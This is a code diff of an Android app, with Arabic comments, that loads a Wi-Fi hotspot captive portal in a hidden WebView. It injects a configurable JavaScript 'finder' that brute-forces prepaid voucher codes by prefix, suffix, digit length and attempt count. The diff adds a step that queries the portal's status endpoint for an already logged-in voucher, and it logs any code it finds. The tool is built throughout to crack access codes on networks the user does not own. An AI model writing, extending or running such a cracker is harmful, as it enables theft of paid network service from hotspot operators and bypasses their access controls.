@@ -11,18 +11,13 @@ import android.webkit.*;
 import android.widget.*;
 import java.io.InputStream;
 import java.nio.charset.StandardCharsets;
-import java.util.Random;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class MainActivity extends Activity {
-    // المتصفح المرئي (يعرض صفحتك)
-    private WebView webView;
-    // المتصفح المخفي (يعمل التخمين الحقيقي)
-    private WebView hiddenWeb;
-    private boolean hiddenInitialized = false;
-    
+    private WebView webView, hiddenWeb;
     private EditText urlBar, etPrefix, etSuffix, etDigits, etAttempts, etPause, etRetry, etStatusEvery, etThreads;
     private TextView statusText, logText, voucherResult;
-    
     private SharedPreferences prefs;
     private String finderJs = "";
     private String realNetworkUrl = "http://7.7.7.7/index.html";
@@ -30,7 +25,7 @@ public class MainActivity extends Activity {
     private Handler uiHandler = new Handler(Looper.getMainLooper());
     private boolean logUpdatePending = false;
     private boolean isRunning = false;
-    private final Random rand = new Random();
+    private boolean hiddenInitialized = false;
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override protected void onCreate(Bundle savedInstanceState) {
@@ -52,8 +47,14 @@ public class MainActivity extends Activity {
         voucherResult = findViewById(R.id.voucherResult);
         webView = findViewById(R.id.webView);
 
-        // الرابط الحقيقي للشبكة (هنا نضعه)
-        realNetworkUrl = prefs.getString("url", "http://7.7.7.7/index.html");
+        // قراءة الرابط المحفوظ مع التحقق
+        String saved = prefs.getString("url", "");
+        if (saved.isEmpty() || saved.equals("http://") || saved.startsWith("file://") || !saved.startsWith("http") || saved.length() < 10) {
+            realNetworkUrl = "http://7.7.7.7/index.html";
+            prefs.edit().putString("url", realNetworkUrl).apply();
+        } else {
+            realNetworkUrl = saved;
+        }
         urlBar.setText(realNetworkUrl);
 
         etPrefix.setText(prefs.getString("prefix", "5"));
@@ -72,7 +73,6 @@ public class MainActivity extends Activity {
             finderJs = new String(buf, StandardCharsets.UTF_8);
         } catch (Exception e) { appendLog("خطأ تحميل JS: " + e.getMessage()); }
 
-        // إعداد الواجهة (تعرض صفحتك)
         WebSettings s = webView.getSettings();
         s.setJavaScriptEnabled(true);
         s.setDomStorageEnabled(true);
@@ -84,17 +84,25 @@ public class MainActivity extends Activity {
 
         webView.setWebViewClient(new WebViewClient() {
             @Override public void onPageFinished(WebView view, String url) {
-                urlBar.setText(url);
+                // لا نغيّر شريط الرابط للصفحات المحلية
+                if (!url.startsWith("file://")) {
+                    urlBar.setText(url);
+                }
             }
         });
 
-        // ربط الأزرار
         findViewById(R.id.btnGo).setOnClickListener(v -> {
-            realNetworkUrl = urlBar.getText().toString().trim();
-            if (!realNetworkUrl.startsWith("http")) realNetworkUrl = "http://" + realNetworkUrl;
+            String entered = urlBar.getText().toString().trim();
+            if (entered.isEmpty() || entered.startsWith("file://")) {
+                Toast.makeText(this, "أدخل رابط الشبكة الحقيقية (مثل: http://7.7.7.7/index.html)", Toast.LENGTH_LONG).show();
+                return;
+            }
+            if (!entered.startsWith("http")) entered = "http://" + entered;
+            realNetworkUrl = entered;
             prefs.edit().putString("url", realNetworkUrl).apply();
-            // إعادة تحميل صفحتك (الواجهة)
-            webView.reload();
+            urlBar.setText(realNetworkUrl);
+            Toast.makeText(this, "✅ تم حفظ الرابط", Toast.LENGTH_SHORT).show();
+            appendLog("✅ رابط الشبكة: " + realNetworkUrl);
         });
 
         findViewById(R.id.btnFinder).setOnClickListener(v -> {
@@ -105,7 +113,6 @@ public class MainActivity extends Activity {
         findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
         findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
         findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());
-
 
         findViewById(R.id.btnStart).setOnClickListener(v -> startCrack());
         findViewById(R.id.btnStop).setOnClickListener(v -> stopCrack());
@@ -118,7 +125,6 @@ public class MainActivity extends Activity {
             appendLog("🗑️ تم مسح الكوكيز");
         });
 
-        // تحميل صفحتك في الواجهة
         webView.loadUrl("file:///android_asset/network_source/index.html");
     }
 
@@ -135,21 +141,94 @@ public class MainActivity extends Activity {
     }
 
     private void startCrack() {
+        // التحقق من صحة الرابط
+        if (realNetworkUrl == null || realNetworkUrl.isEmpty() 
+            || realNetworkUrl.startsWith("file://") 
+            || realNetworkUrl.equals("http://") 
+            || realNetworkUrl.length() < 10) {
+            Toast.makeText(this, "❌ الرابط غير صحيح! أدخل رابط الشبكة واضغط اذهب", Toast.LENGTH_LONG).show();
+            appendLog("❌ الرابط الحالي غير صحيح: [" + realNetworkUrl + "]");
+            appendLog("💡 أدخل رابطاً مثل: http://7.7.7.7/index.html");
+            return;
+        }
+        
         isRunning = true;
         initHiddenWeb();
-
+        
+        appendLog("🔍 فحص حالة الشبكة أولاً...");
+        statusText.setText("جاري فحص الشبكة...");
+        voucherResult.setVisibility(View.GONE);
+        
+        String statusUrl = buildStatusUrl(realNetworkUrl);
+        appendLog("📡 " + statusUrl);
+        
+        hiddenWeb.setWebViewClient(new WebViewClient() {
+            boolean processed = false;
+            @Override public void onPageFinished(WebView view, String url) {
+                if (processed) return;
+                processed = true;
+                view.evaluateJavascript(
+                    "(function(){try{return document.body.innerText;}catch(e){return '';}})()",
+                    value -> {
+                        String body = value != null ? value : "";
+                        if (body.startsWith("\"") && body.endsWith("\"")) {
+                            body = body.substring(1, body.length() - 1);
+                            body = body.replace("\\\"", "\"").replace("\\\\", "\\").replace("\\n", " ");
+                        }
+                        
+                        appendLog("📄 الرد: " + (body.length() > 100 ? body.substring(0,100) + "..." : body));
+                        
+                        String voucher = extractJson(body, "username");
+                        String loggedIn = extractJson(body, "logged_in");
+                        boolean isActive = loggedIn != null && (
+                            loggedIn.equalsIgnoreCase("yes") || loggedIn.equalsIgnoreCase("true") || loggedIn.equals("1"));
+                        
+                        if (isActive && voucher != null && !voucher.equals("-") && !voucher.equals("N/A")) {
+                            final String v = voucher;
+                            runOnUiThread(() -> {
+                                appendLog("✅ يوجد كرت مسجل: " + v);
+                                voucherResult.setText("✅ كرت مسجل: " + v);
+                                voucherResult.setVisibility(View.VISIBLE);
+                                statusText.setText("✅ كرت مسجل");
+                                showStatusPage(v);
+                            });
+                        } else {
+                            runOnUiThread(() -> {
+                                appendLog("ℹ لا يوجد كرت مسجل - بدء التخمين...");
+                                startRealCrack();
+                            });
+                        }
+                    });
+            }
+        });
+        hiddenWeb.loadUrl(statusUrl);
+    }
+    
+    private String extractJson(String body, String key) {
+        try {
+            Pattern p = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]+)\"");
+            Matcher m = p.matcher(body);
+            if (m.find()) return m.group(1);
+        } catch (Exception e) {}
+        return null;
+    }
+    
+    private String buildStatusUrl(String base) {
+        if (base.contains("/login")) return base.replace("/login", "/status?var=callBack");
+        if (base.contains("/index.html")) return base.replace("/index.html", "/status?var=callBack");
+        if (base.endsWith("/")) return base + "status?var=callBack";
+        return base + "/status?var=callBack";
+    }
+    
+    private void startRealCrack() {
         String p = etPrefix.getText().toString().trim();
         String s = etSuffix.getText().toString().trim();
         int d = parseInt(etDigits, 7);
         int a = parseInt(etAttempts, 1000);
         int pz = parseInt(etPause, 1000);
-
-        appendLog("▶ بدء التخمين الحقيقي على: " + realNetworkUrl);
-        statusText.setText("جاري التخمين...");
-        voucherResult.setVisibility(View.GONE);
-
+        
         final String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
-
+        
         hiddenWeb.setWebViewClient(new WebViewClient() {
             @Override public void onPageFinished(WebView view, String url) {
                 view.evaluateJavascript(cfg, null);
@@ -157,8 +236,15 @@ public class MainActivity extends Activity {
             }
         });
         hiddenWeb.loadUrl(realNetworkUrl);
+        appendLog("▶ بدء التخمين على: " + realNetworkUrl);
+        statusText.setText("جاري التخمين...");
     }
-
+    
+    private void showStatusPage(String voucher) {
+        String url = "file:///android_asset/network_source/status.html?voucher=" + voucher + "&ip=192.168.1.100&uptime=1h 30m&remain=5.2GB";
+        webView.loadUrl(url);
+    }
+    
     private void stopCrack() {
         isRunning = false;
         if (hiddenWeb != null) {
@@ -167,11 +253,11 @@ public class MainActivity extends Activity {
         statusText.setText("⏹ تم الإيقاف");
         appendLog("⏹ تم الإيقاف");
     }
-
+    
     private int parseInt(EditText e, int def) {
         try { return Integer.parseInt(e.getText().toString().trim()); } catch (Exception ex) { return def; }
     }
-
+    
     private void appendLog(String msg) {
         logBuf.append(msg).append('\n');
         if (!logUpdatePending) {
@@ -183,8 +269,7 @@ public class MainActivity extends Activity {
             }, 100);
         }
     }
-
-    // Bridge للمتصفح المخفي (يعمل التخمين)
+    
     public class HiddenBridge {
         @JavascriptInterface public void log(String m) {
             runOnUiThread(() -> appendLog("[H] " + m));
@@ -203,17 +288,13 @@ public class MainActivity extends Activity {
                 appendLog("✅✅✅ وجد الكرت: " + voucher);
                 statusText.setText("✅ وجد الكرت!");
                 
-                // 1. ملء الحقل في صفحتك (الواجهة)
                 String jsFill = "(function(){ if(window.showVoucherFound) window.showVoucherFound('" + voucher + "'); })();";
                 webView.evaluateJavascript(jsFill, null);
                 
-                // 2. عرض البانر
                 voucherResult.setText("✅ الكرت: " + voucher);
                 voucherResult.setVisibility(View.VISIBLE);
-                
                 Toast.makeText(MainActivity.this, "✅ " + voucher, Toast.LENGTH_LONG).show();
                 
-                // 3. الانتقال التلقائي لصفحة الحالة بعد ثانيتين
                 uiHandler.postDelayed(() -> {
                     String statusUrl = "file:///android_asset/network_source/status.html?voucher=" + voucher + "&ip=192.168.1.100&uptime=1h 30m&remain=5.2GB";
                     webView.loadUrl(statusUrl);
